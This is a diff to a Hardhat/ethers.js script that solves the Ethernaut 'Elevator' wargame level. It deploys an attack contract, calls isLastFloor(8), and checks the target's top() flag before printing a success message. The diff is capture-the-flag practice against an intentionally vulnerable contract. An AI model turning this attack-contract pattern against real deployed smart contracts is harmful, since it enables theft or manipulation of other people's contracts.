@@ -16,11 +16,9 @@ const attackBuilding = async () => {
     // const deployed = await deployContract(hre, "AttackBuilding", args);
     // alternative below
     console.log("Deploying attack contract AttackBuilding...");
-    const Factory = await ethers.getContractFactory("AttackBuilding", deployer);
-    const attackBuilding = await Factory.deploy();
-    console.log(attackBuilding);
-    console.log(`Contract deployed to ${attackBuilding.address}`);
-    console.log("Attack contract deployed...");
+    const attack = await (await ethers.getContractFactory("AttackElevator", deployer)).deploy();
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (attackBuilding.address){
     //     console.log("Verifying contract...");
@@ -49,10 +47,9 @@ const attackBuilding = async () => {
             type: "function",
         },
     ];
-    const attack = await ethers.getContractAt("AttackBuilding", attackBuilding.address);
     const contract = await ethers.getContractAt(ABI, buildingAddress);
     console.log("Making it possible to go to top floor...");
-    const tx1 = await attack.isLastFloor();
+    const tx1 = await attack.isLastFloor(8);
     const tx1Receipt = await tx1.wait();
     console.log(tx1Receipt);
     console.log("Going to the top floor...");
@@ -62,7 +59,7 @@ const attackBuilding = async () => {
     const success = await contract.top();
     console.log(`Top: ${success}`);
     if (success) {
-        console.log("Congrats! Submit to ethernaut.");
+        console.log("Congrats! Level Passed, please submit to ethernaut.");
     } else {
         console.log("Sorry, review code and try again...");
     }
